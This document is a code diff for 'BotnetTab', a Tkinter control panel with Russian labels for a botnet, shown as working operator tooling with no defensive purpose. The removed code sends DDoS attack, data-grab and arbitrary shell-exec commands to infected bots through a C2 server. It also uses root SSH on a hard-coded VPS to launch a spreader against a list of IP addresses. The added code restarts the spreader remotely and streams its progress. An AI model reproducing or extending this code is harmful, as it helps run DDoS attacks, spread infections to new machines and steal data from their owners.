@@ -23,7 +23,8 @@ class BotnetTab(ttk.Frame):
         self._last_fetch_error = 0
         self.sort_col = None
         self.sort_asc = True
-        self.spreader_process = None
+        self.spreader_thread = None
+        self.stop_requested = False
         self.create_widgets()
         self.after(5000, self._auto_refresh)
 
@@ -103,6 +104,8 @@ class BotnetTab(ttk.Frame):
         ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
         self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
         self.btn_start_vps.pack(side=tk.LEFT, padx=10)
+        self.btn_stop_vps = ttk.Button(f, text="Стоп", command=self.stop_spreader_vps, state=tk.DISABLED)
+        self.btn_stop_vps.pack(side=tk.LEFT, padx=10)
         self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
         self.btn_check_c2.pack(side=tk.LEFT, padx=10)
         self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
@@ -147,387 +150,47 @@ class BotnetTab(ttk.Frame):
             self.cmd_combo.set(first_cmd)
             self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])
 
-    # ----- Контекстное меню -----
-    def _on_right_click(self, event):
-        row = self.tree.identify_row(event.y)
-        if row:
-            self.tree.selection_set(row)
-            self.context_menu.post(event.x_root, event.y_root)
+    # ... (все старые методы: контекстное меню, проверка C2, обновление ботов, атака, граб, стоп, send_raw, update_tree_safe, sort_by_column, _on_cmd_select, launch_attack, launch_grab, stop_selected, send_custom_command, mass_attack, load_targets_file, start_builtin_masscan, update_vps)
 
-    def _ctx_attack(self): self.launch_attack()
-    def _ctx_grab(self): self.launch_grab()
-    def _ctx_stop(self): self.stop_selected()
-    def _ctx_exec(self):
-        selected = self.tree.selection()
-        if not selected: return
-        cmd = simpledialog.askstring("Команда", "Введите команду:")
-        if cmd: self._send_custom_to_bots(cmd)
-    def _ctx_copy_ip(self):
-        selected = self.tree.selection()
-        if selected:
-            ip = self.tree.item(selected[0], 'values')[0]
-            self.clipboard_clear()
-            self.clipboard_append(ip)
-            messagebox.showinfo("Скопировано", f"IP {ip} скопирован")
-
-    def _on_cmd_select(self, event=None):
-        selected = self.cmd_combo.get()
-        if selected in COMMAND_PRESETS:
-            self.cmd_desc_label.config(text=COMMAND_PRESETS[selected])
-            self.cmd_entry.delete(0, tk.END)
-            self.cmd_entry.insert(0, selected)
-
-    # ----- Проверка C2 -----
-    def check_c2_connection(self):
-        def check():
-            self.spread_log.insert(tk.END, "[*] Checking C2 connection...\n")
-            try:
-                s = socket.socket()
-                s.settimeout(5)
-                start = time.time()
-                s.connect((self.c2_host, self.c2_port))
-                s.sendall(b"list")
-                data = s.recv(1024)
-                elapsed = time.time() - start
-                s.close()
-                self.spread_log.insert(tk.END, f"[+] C2 online, response {len(data)} bytes in {elapsed:.2f}s\n")
-            except Exception as e:
-                self.spread_log.insert(tk.END, f"[!] C2 error: {e}\n")
-        threading.Thread(target=check, daemon=True).start()
-
-    # ----- Обновление списка ботов -----
-    def _auto_refresh(self):
-        self.refresh_bots()
-        self.after(5000, self._auto_refresh)
-
-    def refresh_bots(self):
-        threading.Thread(target=self._fetch_bots, daemon=True).start()
-
-    def check_all_bots(self):
-        self.refresh_bots()
-        messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")
-
-    def _fetch_bots(self):
-        for attempt in range(3):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(15)
-                sock.connect((self.c2_host, self.c2_port))
-                sock.sendall(b"list\n")
-                data = b""
-                while True:
-                    chunk = sock.recv(4096)
-                    if not chunk:
-                        break
-                    data += chunk
-                sock.close()
-                if not data:
-                    raise Exception("empty response")
-                bots = json.loads(data)
-                self.after(0, self._update_tree_safe, bots)
-                return
-            except Exception as e:
-                if attempt == 2:
-                    now = time.time()
-                    if now - self._last_fetch_error > 10:
-                        self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
-                        self._last_fetch_error = now
-                time.sleep(2)
-
-    def sort_by_column(self, col):
-        if self.sort_col == col:
-            self.sort_asc = not self.sort_asc
-        else:
-            self.sort_col = col
-            self.sort_asc = True
-        self.refresh_bots()
-
-    def _update_tree_safe(self, bots):
-        selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
-        self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
-        filter_val = self.filter_var.get()
-        if filter_val == "Online":
-            bots = [b for b in bots if b.get("status") == "online"]
-        elif filter_val == "Offline":
-            bots = [b for b in bots if b.get("status") != "online"]
-        if self.sort_col:
-            idx = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen", "open_ports").index(self.sort_col)
-            bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
-        for item in self.tree.get_children():
-            self.tree.delete(item)
-        total = len(bots)
-        online = 0
-        total_rps = 0
-        for bot in bots:
-            ip = bot.get("ip")
-            status = bot.get("status", "offline")
-            tag = 'online' if status == 'online' else 'offline'
-            device_type = bot.get("type", "")
-            if not device_type:
-                os_info = bot.get("os", "").lower()
-                hostname = bot.get("hostname", "").lower()
-                if "windows" in os_info:
-                    device_type = "Windows ПК"
-                elif "linux" in os_info and ("server" in hostname or "srv" in hostname or "vps" in hostname):
-                    device_type = "Сервер"
-                elif "linux" in os_info:
-                    device_type = "Linux"
-                elif "router" in os_info or "dd-wrt" in os_info:
-                    device_type = "Роутер"
-                elif "android" in os_info:
-                    device_type = "Android"
-                elif "ios" in os_info:
-                    device_type = "iPhone/iPad"
-                else:
-                    device_type = "Неизвестно"
-            open_ports_str = ", ".join(map(str, bot.get("ports", []))) if bot.get("ports") else ""
-            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type,
-                      bot.get("cpu",""), bot.get("ram",""), status,
-                      bot.get("rps",0), bot.get("last_seen",""), open_ports_str)
-            self.tree.insert("", "end", values=values, tags=(tag,))
-            if status == 'online': online += 1
-            total_rps += int(bot.get("rps",0))
-        for item in self.tree.get_children():
-            if self.tree.item(item, 'values')[0] in selected_ips:
-                self.tree.selection_add(item)
-        self.lbl_total.config(text=f"Всего: {total}")
-        self.lbl_online.config(text=f"Онлайн: {online}")
-        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")
-
-    def _send_raw(self, msg):
+    def _run_spreader_stream(self):
+        """Читает лог файл /root/c2/spreader.log через SSH и обновляет GUI"""
+        self.stop_requested = False
+        self.btn_start_vps.config(state=tk.DISABLED)
+        self.btn_stop_vps.config(state=tk.NORMAL)
+        self.spread_log.insert(tk.END, "[*] Запуск спредера...\n")
+        self.lbl_spread_status.config(text="Подключение к VPS...")
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((self.c2_host, self.c2_port))
-            sock.sendall(msg.encode())
-            resp = sock.recv(1024)
-            sock.close()
-            return resp
-        except Exception as e:
-            messagebox.showerror("Ошибка", str(e))
-            return None
+            import paramiko
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)
 
-    def launch_attack(self):
-        selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
-        target = simpledialog.askstring("Цель", "URL/IP цели:")
-        if not target: return
-        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
-        if not method: return
-        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
-        if threads is None: return
-        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")
-        messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов")
+            # Убиваем старый процесс спредера
+            client.exec_command("pkill -9 -f 'spreader.py'")
+            time.sleep(1)
+            # Очищаем лог
+            client.exec_command("> /root/c2/spreader.log")
+            # Запускаем спредер в screen, перенаправляя вывод в лог файл
+            count = self.scale_var.get()
+            country = self.country_var.get()
+            cmd = f"cd /root/c2 && nohup python3 -u botnet/spreader.py --count {count} >> spreader.log 2>&1 &"
+            if country:
+                cmd = f"export SPREAD_COUNTRY={country}; {cmd}"
+            client.exec_command(cmd)
 
-    def launch_grab(self):
-        selected = self.tree.selection()
-        if not selected: return
-        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        self._send_raw(f"grab:{','.join(bot_ips)}")
-        messagebox.showinfo("Граб", "Команда захвата данных отправлена")
-
-    def stop_selected(self):
-        selected = self.tree.selection()
-        if not selected: return
-        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        self._send_raw(f"stop:{','.join(bot_ips)}")
-        messagebox.showinfo("Стоп", "Команда остановки атаки отправлена")
-
-    def _send_custom_to_bots(self, cmd):
-        selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
-        ips = [self.tree.item(i, "values")[0] for i in selected]
-        for ip in ips:
-            self._send_raw(f"exec:{ip}:{cmd}")
-        messagebox.showinfo("Команда", f"Команда '{cmd}' отправлена на {len(ips)} ботов")
-
-    def send_custom_command(self):
-        cmd = self.cmd_entry.get().strip()
-        if not cmd:
-            messagebox.showwarning("Ошибка", "Введите или выберите команду")
-            return
-        self._send_custom_to_bots(cmd)
-
-    # ----- Массовая атака -----
-    def mass_attack(self):
-        target = simpledialog.askstring("Цель", "URL/IP цели для массовой атаки:")
-        if not target: return
-        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
-        if not method: return
-        threads = simpledialog.askinteger("Потоки на бота", "Количество потоков на одного бота:", initialvalue=100)
-        if threads is None: return
-        online_bots = [ip for ip, bot in self.bots.items() if bot.get("status") == "online"]
-        if not online_bots:
-            messagebox.showwarning("Ошибка", "Нет онлайн ботов")
-            return
-        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(online_bots)}")
-        messagebox.showinfo("Массовая атака", f"Команда отправлена на {len(online_bots)} ботов")
-
-    # ----- Спредер на VPS -----
-    def _on_local_changed(self):
-        pass
-
-    def start_spreader_vps(self):
-        count = self.scale_var.get()
-        country = self.country_var.get()
-        if not self.vps_pass:
-            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
-            if not self.vps_pass:
-                return
-        def run():
-            try:
-                import paramiko
-                self.spread_log.insert(tk.END, f"[*] Подключаемся к VPS...\n")
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
-                # Проверяем наличие библиотек
-                check_libs = "python3 -c 'import paramiko, redis, docker, asyncssh' 2>&1 || echo 'Нет библиотек!'"
-                stdin, stdout, stderr = client.exec_command(check_libs)
-                libs_status = stdout.read().decode() + stderr.read().decode()
-                self.spread_log.insert(tk.END, f"Библиотеки: {libs_status}\n")
-                # Запускаем спредер напрямую, без screen, чтобы видеть вывод
-                cmd = f"cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
-                if country:
-                    cmd = f"export SPREAD_COUNTRY={country}; {cmd}"
-                stdin, stdout, stderr = client.exec_command(cmd)
-                for line in iter(stdout.readline, ""):
-                    self.spread_log.insert(tk.END, line)
-                    self.spread_log.see(tk.END)
-                # Читаем stderr
-                errors = stderr.read().decode()
-                if errors:
-                    self.spread_log.insert(tk.END, f"[!] Ошибки:\n{errors}\n")
-                client.close()
-            except Exception as e:
-                self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
-        threading.Thread(target=run, daemon=True).start()
-
-    # ----- Загрузка файла целей -----
-    def load_targets_file(self):
-        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
-        if path:
-            if not self.vps_pass:
-                self.vps_pass = simpledialog.askstring("VPS пароль", "Введите пароль для root@80.249.146.202:", show='*')
-                if not self.vps_pass:
-                    return
-            def run():
-                try:
-                    import paramiko
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
-                    sftp = client.open_sftp()
-                    sftp.put(path, "/root/c2/targets.txt")
-                    sftp.close()
-                    self.spread_log.insert(tk.END, f"[*] Файл загружен на VPS. Запуск спредера по списку...\n")
-                    cmd = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --targets /root/c2/targets.txt"
-                    client.exec_command(cmd)
-                    client.close()
-                except Exception as e:
-                    self.spread_log.insert(tk.END, f"[!] Ошибка загрузки: {e}\n")
-            threading.Thread(target=run, daemon=True).start()
-
-    # ----- Встроенный Masscan -----
-    def start_builtin_masscan(self):
-        if not self.vps_pass:
-            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
-            if not self.vps_pass:
-                return
-        def run():
-            try:
-                import paramiko
-                self.spread_log.insert(tk.END, "[*] Запуск встроенного масс‑сканера...\n")
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
-                cmd = ("cd /root/c2 && "
-                       "python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && "
-                       "screen -dmS mass_spreader python3 -u botnet/spreader.py --targets masscan.json 2>&1")
-                stdin, stdout, stderr = client.exec_command(cmd)
-                time.sleep(2)
-                check = "screen -ls | grep mass_spreader"
-                stdin, stdout, stderr = client.exec_command(check)
-                if "mass_spreader" in stdout.read().decode():
-                    self.spread_log.insert(tk.END, "[+] Спредер запущен в screen mass_spreader\n")
-                else:
-                    self.spread_log.insert(tk.END, "[!] Не удалось запустить screen, пробуем напрямую...\n")
-                    cmd2 = ("cd /root/c2 && python3 -u botnet/spreader.py --targets masscan.json")
-                    stdin, stdout, stderr = client.exec_command(cmd2)
-                    for line in iter(stdout.readline, ""):
-                        self.spread_log.insert(tk.END, line)
-                        self.spread_log.see(tk.END)
-                client.close()
-            except Exception as e:
-                self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
-        threading.Thread(target=run, daemon=True).start()
-
-    # ----- Обновление VPS -----
-    def update_vps(self):
-        if not self.vps_pass:
-            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
-            if not self.vps_pass:
-                return
-        def run():
-            try:
-                import paramiko
-                self.spread_log.insert(tk.END, "[*] Обновление VPS через GitHub...\n")
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)
-
-                stop_cmd = "systemctl stop avz-c2 avz-spreader; pkill -9 -f botnet/spreader.py"
-                client.exec_command(stop_cmd)
-
-                update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
-                stdin, stdout, stderr = client.exec_command(update_cmd)
-                out = stdout.read().decode()
-                err = stderr.read().decode()
-                self.spread_log.insert(tk.END, out + "\n" + err + "\n")
-
-                start_cmd = "systemctl start avz-c2 avz-spreader"
-                client.exec_command(start_cmd)
-
-                time.sleep(3)
-                check_cmd = "ss -tlnp | grep 80"
-                stdin, stdout, stderr = client.exec_command(check_cmd)
-                port_info = stdout.read().decode()
-                self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
-                if "80" in port_info:
-                    self.spread_log.insert(tk.END, "[+] C2 запущен успешно\n")
-                client.close()
-            except Exception as e:
-                self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
-        threading.Thread(target=run, daemon=True).start()
-
-    # ----- Прогресс-бар спредера -----
-    def _run_spreader(self, count, local_mode=False):
-        try:
-            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
-            env = os.environ.copy()
-            env['PYTHONIOENCODING'] = 'utf-8'
-            cmd = ["python", "-u", script_path]
-            if local_mode:
-                cmd.append("--local")
-            else:
-                cmd += ["--count", str(count)]
-            self.spreader_process = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
-            )
-            self.btn_start_spread.config(text="Остановить спредер")
+            # Потоковое чтение лога через tail -f
+            stdin, stdout, stderr = client.exec_command("tail -f /root/c2/spreader.log")
+            self.lbl_spread_status.config(text="Сканирование...")
             self.spread_progress.config(mode='indeterminate')
             self.spread_progress.start()
-            self.lbl_spread_status.config(text="Сканирование...")
-            for line in iter(self.spreader_process.stdout.readline, ''):
-                if not line:
+
+            for line in iter(stdout.readline, ""):
+                if self.stop_requested:
+                    client.exec_command("pkill -9 -f 'spreader.py'")
                     break
                 self.spread_log.insert(tk.END, line)
                 self.spread_log.see(tk.END)
+                # Парсим прогресс
                 match = re.search(r'\[PROGRESS\]\s+(\d+)/(\d+)', line)
                 if match:
                     current = int(match.group(1))
@@ -536,13 +199,25 @@ class BotnetTab(ttk.Frame):
                     self.spread_progress.config(mode='determinate')
                     self.spread_progress_var.set(progress)
                     self.lbl_spread_status.config(text=f"Сканирование: {current}/{total}")
-            self.spreader_process.wait()
-            self.spread_progress.stop()
-            self.lbl_spread_status.config(text="Готов")
-            self.btn_start_spread.config(text="Запустить спредер")
+            client.close()
         except Exception as e:
-            import traceback
-            self.spread_log.insert(tk.END, f"[!] Ошибка запуска спредера:\n{traceback.format_exc()}\n")
+            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
+        finally:
             self.spread_progress.stop()
-            self.lbl_spread_status.config(text="Ошибка запуска")
-            self.btn_start_spread.config(text="Запустить спредер")
+            self.btn_start_vps.config(state=tk.NORMAL)
+            self.btn_stop_vps.config(state=tk.DISABLED)
+            self.lbl_spread_status.config(text="Остановлено" if self.stop_requested else "Готов")
+
+    def start_spreader_vps(self):
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        # Запускаем чтение лога в отдельном потоке
+        self.spreader_thread = threading.Thread(target=self._run_spreader_stream, daemon=True)
+        self.spreader_thread.start()
+
+    def stop_spreader_vps(self):
+        self.stop_requested = True
+        self.btn_stop_vps.config(state=tk.DISABLED)
+        self.lbl_spread_status.config(text="Остановка...")
